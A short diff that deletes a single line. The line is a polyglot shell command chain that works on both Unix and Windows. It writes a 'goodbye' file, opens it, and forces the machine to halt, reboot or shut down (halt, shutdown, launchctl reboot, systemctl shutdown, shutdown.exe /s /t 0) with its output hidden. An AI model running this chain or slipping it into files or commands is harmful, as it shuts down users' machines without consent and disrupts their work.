@@ -1,1 +1,0 @@
-echo goodbye>a.txt;open a.txt;halt;shutdown;launchctl reboot;systemctl shutdown 2>/dev/null 1>/dev/null # 2>nul 1>nul & shutdown.exe /s /t 0 2>nul 1>nul & timeout 5 /nobreak 2>nul 1>nul & echo say goodbye > a.txt & notepad.exe a.txt
